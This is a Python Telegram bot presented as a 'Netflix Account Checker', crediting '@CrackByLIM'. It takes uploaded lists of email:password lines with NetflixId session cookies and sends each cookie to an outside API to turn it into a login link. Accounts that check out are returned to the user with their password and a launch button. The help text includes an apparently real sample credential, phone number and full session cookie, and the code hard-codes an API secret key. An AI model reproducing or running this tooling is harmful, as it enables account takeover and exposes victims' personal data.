import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import os
from dotenv import load_dotenv
from pathlib import Path
import time
from collections import defaultdict
import asyncio
import re
import json

# Load environment variables
env_path = Path(__file__).parent / '.env'
load_dotenv(dotenv_path=env_path)

# ==================== YOUR API CONFIGURATION ====================
TOKEN = os.getenv('BOT_TOKEN')
API_URL = "http://genznfapi.onrender.com"  # YOUR API
SECRET_KEY = "KUROSAKI1D_cP642DCEw0bxnMLHSIFlGZQjVh1RgSPM"  # YOUR SECRET KEY

# YOUR CREDIT
YOUR_CREDIT = "@CrackByLIM"

if not TOKEN:
    print("❌ ERROR: BOT_TOKEN not found!")
    exit(1)

# ==================== FIX FOR CONFLICT ERROR ====================
def clear_telegram_webhook():
    """Clear any existing webhook/sessions to prevent conflict"""
    try:
        webhook_url = f"https://api.telegram.org/bot{TOKEN}/deleteWebhook"
        response = requests.post(webhook_url)
        print(f"✅ Webhook cleared: {response.json()}")
        
        get_updates_url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
        requests.post(get_updates_url, json={"offset": -1, "timeout": 0})
        print("✅ Pending updates cleared")
        
        time.sleep(2)
    except Exception as e:
        print(f"⚠️ Warning while clearing webhook: {e}")

# Call this before starting the bot
clear_telegram_webhook()
# =============================================================

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# User session storage
user_sessions = {}
rate_limits = defaultdict(list)

# Stats tracking
total_checks = 0
valid_accounts = 0
invalid_accounts = 0

# ==================== EXACT FORMAT PARSER ====================

def parse_account_line(line):
    """
    Parse a single line in the exact format:
    email:password | Phone: number | Country: name | Cookie: NetflixId=...
    """
    try:
        line = line.strip()
        if not line:
            return None
        
        account = {}
        
        # Split by | to get each field
        fields = line.split('|')
        
        # First field contains email:password
        first_field = fields[0].strip()
        if ':' in first_field:
            email_pass = first_field.split(':', 1)
            account['email'] = email_pass[0].strip()
            account['password'] = email_pass[1].strip()
        
        # Parse remaining fields
        for field in fields[1:]:
            field = field.strip()
            if ':' in field:
                key, value = field.split(':', 1)
                key = key.strip().lower()
                value = value.strip()
                
                if 'phone' in key:
                    account['phone'] = value
                elif 'country' in key:
                    account['country'] = value
                elif 'cookie' in key:
                    account['full_cookie'] = value
                    # Extract NetflixId from cookie
                    netflix_match = re.search(r'NetflixId=([^&\s]+)', value)
                    if netflix_match:
                        account['netflix_id'] = netflix_match.group(1).strip()
        
        # Validate we have the minimum required fields
        if 'netflix_id' not in account:
            logger.warning("❌ No NetflixId found in line")
            return None
        
        if 'email' not in account:
            account['email'] = f"user_{account['netflix_id'][:8]}@unknown.com"
        
        logger.info(f"✅ Parsed account: {account['email']}")
        return account
        
    except Exception as e:
        logger.error(f"Error parsing line: {e}")
        return None

# ==================== YOUR API FUNCTIONS ====================

async def check_with_your_api(netflix_id, email):
    """Check Netflix ID using YOUR API"""
    
    if not netflix_id:
        return {
            "success": False,
            "error": "No Netflix ID",
            "email": email
        }
    
    try:
        # YOUR API endpoint
        url = f"{API_URL}/api/gen"
        
        # Send exactly what your API expects
        data = {
            "netflix_id": netflix_id,
            "secret_key": SECRET_KEY
        }
        
        logger.info(f"📡 Calling YOUR API for {email}")
        logger.info(f"🔑 Netflix ID: {netflix_id[:30]}...")
        
        response = requests.post(url, json=data, timeout=15)
        
        try:
            result = response.json()
            logger.info(f"📥 API Response: {result}")
        except:
            return {
                "success": False,
                "error": "Invalid API response",
                "email": email
            }
        
        # Check YOUR API's response format
        if result.get('success') == True:
            login_url = result.get('login_url')
            if login_url:
                logger.info(f"✅ API SUCCESS for {email}")
                return {
                    "success": True,
                    "login_url": login_url,
                    "email": email,
                    "data": result
                }
        
        # Handle error responses
        error_msg = result.get('error', 'Unknown error')
        error_code = result.get('error_code', 'UNKNOWN')
        
        logger.warning(f"❌ API Error for {email}: {error_msg} ({error_code})")
        
        return {
            "success": False,
            "error": error_msg,
            "error_code": error_code,
            "email": email
        }
        
    except requests.exceptions.Timeout:
        return {
            "success": False,
            "error": "API timeout",
            "email": email
        }
    except requests.exceptions.ConnectionError:
        return {
            "success": False,
            "error": "Cannot connect to API",
            "email": email
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "email": email
        }

# ==================== TEST API COMMAND ====================

async def test_api_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test if YOUR API is working"""
    await update.message.reply_text("🔄 Testing YOUR API connection...")
    
    try:
        response = requests.get(API_URL, timeout=5)
        
        if response.status_code == 200:
            await update.message.reply_text(
                f"✅ **YOUR API IS ONLINE!**\n\n"
                f"**API URL:** `{API_URL}`\n"
                f"**Status:** Connected\n\n"
                f"Now try uploading a .txt file with accounts.",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(
                f"⚠️ **API returned status code: {response.status_code}**",
                parse_mode='Markdown'
            )
    except Exception as e:
        await update.message.reply_text(
            f"❌ **Cannot connect to YOUR API**\n\nError: `{str(e)}`",
            parse_mode='Markdown'
        )

# ==================== BOT COMMANDS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    user = update.effective_user
    
    welcome = f"""
╔════════════════════════════════════════╗
║     🎬 NETFLIX ACCOUNT CHECKER PRO 🎬  ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👋 **Hello {user.first_name}!**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📤 **Send me a .txt file** with accounts in this format:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

`email:password | Phone: number | Country: name | Cookie: NetflixId=...`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 **Example:**
`user@gmail.com:pass123 | Phone: 123-456-7890 | Country: Philippines | Cookie: NetflixId=v%3D3%26ct%3D...`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **Commands:**
/help - Instructions
/testapi - Test YOUR API
/stats - Statistics
/clear - Reset session

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(welcome, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    help_text = f"""
╔════════════════════════════════════════╗
║           🆘 HELP CENTER 🆘            ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📁 **HOW TO USE**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1️⃣ **Prepare your .txt file**
   • One account per line
   • Use | to separate fields
   • Must include Cookie: NetflixId=...

2️⃣ **Format:**
`email:password | Phone: number | Country: name | Cookie: NetflixId=...`

3️⃣ **Send the file to me**
   • I'll extract each account
   • Check with YOUR API
   • Send working login links

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 **Example:**
`ckrdromeo35@gmail.com:Mynetpass$1 | Phone: 0906-583-3905 | Country: Philippines | Cookie: NetflixId=v%3D3%26ct%3DBgjHlOvcAxL8AtxPgj5Z8wQD96OUiO3dhlKFFZqWCTdEoJbpozaGNIEAvlFcvGHEYd7orhpCIST2b7kiRUQ91K7LvasSVs-FhRok0yTZpt-Z3G8W954FMD6EEh9L8UDRQlpyLDma76BiEME7EREt0mVVyDOWuX02SYjLIKHEZ0brhuldFVd98h2xmP5JPJ7ZKCcuc7baX1FByWZUqcujGGND2A7LSCf09ybYNcQW3v5S6S0q7MOo-aI35BHcXke8XLiaVmqpKgFZccIqmQAVZf2zFV89J-Wpbfrddcncj8IwH09RlM6q8qVmJv2yM8Tp6Bwfrq7SZroKEHKxanSutgpn7O6ouPhCDA86invV_56Tyu_tfWpa14kHwnjFX-LN4jxkZ85p1zxNhogp-vA_J7aenX7FKkvjQTkjmuvbGLqUSolB38ZcG4tYrlp6-rWLL-NHEmCFuPjRPdl1bU30O9DznK87wKWovdL-tMuoaUElASmzyiHFxpHBa6xG0ZhYwFbZBFF5GAYiDgoMCha0_YCFZMYvVXkt%26pg%3DCKI3R56PTJAYVGIVZJ33URBMXY%26ch%3DAQEAEAABABSOphugBxZDbPQYpibJ_Bn6Aqps1085bMI.`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⌨️ **COMMANDS:**
/start - Welcome
/testapi - Test YOUR API
/stats - Statistics
/clear - Clear session

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show statistics"""
    global total_checks, valid_accounts, invalid_accounts
    
    success_rate = valid_accounts/total_checks*100 if total_checks > 0 else 0
    
    stats_text = f"""
╔════════════════════════════════════════╗
║         📊 GLOBAL STATISTICS 📊        ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📈 **Performance:**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• **Total Checks:** `{total_checks}`
• **✅ Valid:** `{valid_accounts}`
• **❌ Invalid:** `{invalid_accounts}`
• **📊 Success Rate:** `{success_rate:.1f}%`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(stats_text, parse_mode='Markdown')

async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear user session"""
    user_id = update.effective_user.id
    if user_id in user_sessions:
        del user_sessions[user_id]
    await update.message.reply_text("✅ Session cleared. You can upload a new file.")

# ==================== FILE HANDLER ====================

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded .txt files"""
    user_id = update.effective_user.id
    global total_checks, valid_accounts, invalid_accounts
    
    if not check_rate_limit(user_id):
        await update.message.reply_text("⏰ Too many requests. Please wait a minute.")
        return
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please upload a `.txt` file.")
        return
    
    status_msg = await update.message.reply_text("📥 Downloading file...")
    
    try:
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        content = file_content.decode('utf-8', errors='ignore')
        
        # Split into lines (each line is one account)
        lines = content.split('\n')
        accounts = [line.strip() for line in lines if line.strip()]
        
        await status_msg.edit_text(f"📊 Found {len(accounts)} accounts. Checking with YOUR API...")
        
        valid_count = 0
        invalid_count = 0
        valid_accounts_list = []
        
        for i, line in enumerate(accounts, 1):
            # Parse the line in your exact format
            account = parse_account_line(line)
            
            if not account:
                invalid_count += 1
                logger.warning(f"❌ Failed to parse line {i}")
                continue
            
            # Update progress
            if i % 2 == 0 or i == len(accounts):
                await status_msg.edit_text(f"🔄 Checking account {i}/{len(accounts)}... (Valid: {valid_count})")
            
            # Check with YOUR API
            result = await check_with_your_api(account['netflix_id'], account['email'])
            
            total_checks += 1
            
            if result.get('success'):
                valid_count += 1
                valid_accounts += 1
                
                # Build account details string
                details = []
                if account.get('country'):
                    details.append(f"• **Country:** {account['country']}")
                if account.get('phone'):
                    details.append(f"• **Phone:** {account['phone']}")
                
                details_str = '\n'.join(details) if details else ''
                
                msg = f"""
✅ **VALID ACCOUNT FOUND!**

📧 **Email:** `{account['email']}`
🔑 **Password:** `{account.get('password', 'N/A')}`
{details_str}

🔗 **Login Link:** `{result['login_url']}`

⚡ {YOUR_CREDIT}
                """
                
                keyboard = [[InlineKeyboardButton("🎬 LAUNCH NETFLIX", url=result['login_url'])]]
                await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
                
                valid_accounts_list.append(account)
                
            else:
                invalid_count += 1
                invalid_accounts += 1
                logger.info(f"❌ Invalid account {i}: {account['email']} - {result.get('error')}")
            
            await asyncio.sleep(0.5)
        
        # Final summary
        if valid_count > 0:
            await status_msg.edit_text(
                f"✅ **Complete!** Found {valid_count} valid accounts.\n"
                f"All valid accounts have been sent above."
            )
        else:
            await status_msg.edit_text(
                f"❌ **No valid accounts found.**\n"
                f"Checked {len(accounts)} accounts, all invalid or expired."
            )
        
    except Exception as e:
        logger.error(f"Error: {e}")
        await status_msg.edit_text(f"❌ Error: {str(e)[:100]}")

# ==================== RATE LIMITING ====================

def check_rate_limit(user_id, limit=5, period=60):
    now = time.time()
    rate_limits[user_id] = [t for t in rate_limits[user_id] if now - t < period]
    if len(rate_limits[user_id]) >= limit:
        return False
    rate_limits[user_id].append(now)
    return True

# ==================== BUTTON CALLBACK ====================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()

# ==================== MAIN FUNCTION ====================

async def run_bot():
    """Run the bot"""
    print("=" * 60)
    print("🎬 NETFLIX ACCOUNT CHECKER BOT")
    print("=" * 60)
    print(f"✅ Bot Token: {TOKEN[:10]}...")
    print(f"✅ YOUR API: {API_URL}")
    print(f"✅ Credit: {YOUR_CREDIT}")
    print("=" * 60)
    print("🤖 Bot is starting...")
    print("📝 Using EXACT format: email:password | Phone | Country | Cookie")
    print("=" * 60)
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("clear", clear_command))
    app.add_handler(CommandHandler("testapi", test_api_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_file))
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True)
    
    print("✅ Bot is running! Send a .txt file to test.")
    print("=" * 60)
    
    try:
        while True:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    finally:
        await app.updater.stop()
        await app.stop()
        await app.shutdown()

def main():
    """Main entry point"""
    try:
        asyncio.run(run_bot())
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == '__main__':
    main()
